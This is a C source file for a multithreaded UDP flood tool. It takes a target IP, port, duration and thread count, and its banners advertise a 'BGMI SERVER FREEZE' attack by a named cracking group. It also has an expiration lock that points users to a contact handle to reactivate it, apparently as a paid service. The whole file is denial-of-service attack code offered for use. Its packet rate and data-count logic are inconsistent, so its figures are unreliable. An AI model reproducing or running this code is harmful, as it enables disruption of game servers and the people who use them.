#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>

#define BUFFER_SIZE 9000
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 9
#define EXPIRATION_DAY 27

char *ip;
int port;
int duration;
int threads;
char padding_data[2 * 1024 * 1024];
volatile sig_atomic_t stop_flag = 0;
unsigned long packets_sent = 0;
unsigned long packets_failed = 0;

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);   
    if (difftime(now, mktime(&expiration_date)) > 0) {
        fprintf(stderr, "❌ THIS FILE HAS EXPIRED ❌\nContact @RARExxOWNER to reactivate. 🌐\n");
        exit(EXIT_FAILURE);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;
    
    CPU_ZERO(&cpuset);  // Initialize CPU set
    CPU_SET(sched_getcpu(), &cpuset);  // Set current CPU
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("❌ Thread CPU affinity failed");
        pthread_exit(NULL);
    }

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("❌ Socket creation failed");
        pthread_exit(NULL);
    }

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0) {
        perror("❌ fcntl F_GETFL failed");
        close(sock);
        pthread_exit(NULL);
    }
    if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) {
        perror("❌ fcntl F_SETFL failed");
        close(sock);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("❌ Invalid address");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "🔥 UDP Traffic Test");
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    // Display the initial message once and then update the remaining time in the same line
    while (time(NULL) < end_time && !stop_flag) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                perror("❌ Send failed");
                break;
            }
        }
        packets_sent++;

        // Update the remaining time in the same line (single message)
        time_t remaining_time = end_time - time(NULL);
        printf("\r⏳ REMAINING TIME FOR ATTACK: %ld SECONDS   ", remaining_time); // overwrite the line
        fflush(stdout);
        usleep(1000000);  // Sleep for 1 second
    }

    if (close(sock) < 0) {
        perror("❌ Failed to close socket");
    }
    printf("\n");  // Move to the next line after the attack finishes
    pthread_exit(NULL);
}

void *expiration_check_thread(void *arg) {
    while (!stop_flag) {
        check_expiration();
        sleep(3600);
    }
    pthread_exit(NULL);
}

void signal_handler(int signum) {
    stop_flag = 1;
}

void display_attack_start() {
    printf("\n✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
    printf("🌊🌊🌊 ATTACK BY @RARExxOWNER 🌊🌊🌊\n");
    printf("🎯 TARGETING IP: %s\n", ip);
    printf("📍 TARGET PORT: %d\n", port);
    printf("⏳ ATTACK DURATION: %d SECONDS\n", duration);
    printf("💥 THREADS: %d\n", threads);
    printf("⚡ METHOD: BGMI SERVER FREEZE BY RARECRACKS TEAM ⚡\n");
    printf("✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
}

void display_attack_summary() {
    unsigned long data_in_kb = (packets_sent * strlen("UDP traffic test")) / 1024;
    double data_in_gb = (packets_sent * strlen("UDP traffic test")) / 1024.0 / 1024.0 / 1024.0;

    printf("\n────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
    printf("🎉 SCRIPT CODED BY @RARECRACKS 🎉\n");
    printf("💻 OWNER = @RARExxOWNER 💻\n");
    printf("✨ ATTACK FINISHED: ✨\n");
    printf("✅ PACKETS SENT: %ld\n", packets_sent);
    printf("✅ SUCCESSFUL PACKETS: %ld\n", packets_sent - packets_failed);
    printf("❌ FAILED PACKETS: %ld\n", packets_failed);
    printf("📦 DATA DELIVERED: %ld KB\n", data_in_kb);
    printf("📦 DATA DELIVERED (IN GB): %.2f GB\n", data_in_gb);
    printf("────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──\n");
}

int main(int argc, char *argv[]) {

    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        perror("❌ Signal setup failed");
        exit(EXIT_FAILURE);
    }

    if (argc != 5) {
        fprintf(stderr, "❌ Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    threads = atoi(argv[4]);

    // Display initial watermark message when attack starts
    display_attack_start();

    check_expiration();

    pthread_t tid[threads];
    pthread_t exp_tid;

    if (pthread_create(&exp_tid, NULL, expiration_check_thread, NULL) != 0) {
        perror("❌ Expiration check thread creation failed");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("❌ Thread creation failed");
            stop_flag = 1;
            for (int j = 0; j < i; j++) {
                pthread_cancel(tid[j]);
                pthread_join(tid[j], NULL);
            }
            pthread_cancel(exp_tid);
            pthread_join(exp_tid, NULL);
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    stop_flag = 1;
    pthread_join(exp_tid, NULL);

    // Display the attack summary after completion
    display_attack_summary();

    return 0;
}
